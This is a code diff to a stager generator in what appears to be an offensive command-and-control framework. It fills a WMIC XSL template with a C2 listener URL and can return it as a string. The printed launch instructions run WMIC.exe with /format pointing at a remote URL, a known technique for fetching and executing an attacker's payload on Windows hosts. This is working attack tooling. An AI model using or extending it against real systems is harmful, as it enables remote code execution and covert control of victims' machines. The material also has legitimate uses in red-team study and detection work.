@@ -8,18 +8,19 @@ class STStager:
         self.author = '@byt3bl33d3r'
         self.options = {}
 
-    def generate(self, listener, filename=None):
-        stager_filename = 'wmic.xsl'
-        if filename is not None:
-            stager_filename = filename
-        with open(stager_filename, 'w') as stager:
-            with open('stagers/templates/wmic.xsl') as template:
-                template = template.read()
-                template = template.replace('C2_URL', f"https://{listener['BindIP']}:{listener['Port']}")
-                template = template.replace('C2_CHANNEL', f"{listener.name}")
-                stager.write(template)
+    def generate(self, listener, filename=None, as_string=False):
+        stager_filename = filename if filename else 'wmic.xsl'
 
-                print_good(f"Generated stager to {stager.name}")
-                print_info("Launch with:")
-                print(f"\tC:\\Windows\\System32\\wbem\\WMIC.exe os get /format:\"https://myurl/{stager_filename}\"")
-                print(f"\tC:\\Windows\\System32\\wbem\\WMIC.exe os get /format:\"{stager_filename}\"")
+        with open('stagers/templates/wmic.xsl') as template:
+            template = template.read()
+            template = template.replace("C2_URL", f"{listener.name}://{listener['BindIP']}:{listener['Port']}")
+
+            if not as_string:
+                with open(stager_filename, 'w') as stager:
+                    stager.write(template)
+                    print_good(f"Generated stager to {stager.name}")
+                    print_info("Launch with:")
+                    print(f"\tC:\\Windows\\System32\\wbem\\WMIC.exe os get /format:\"https://myurl/{stager_filename}\"")
+                    print(f"\tC:\\Windows\\System32\\wbem\\WMIC.exe os get /format:\"{stager_filename}\"")
+            else:
+                return template
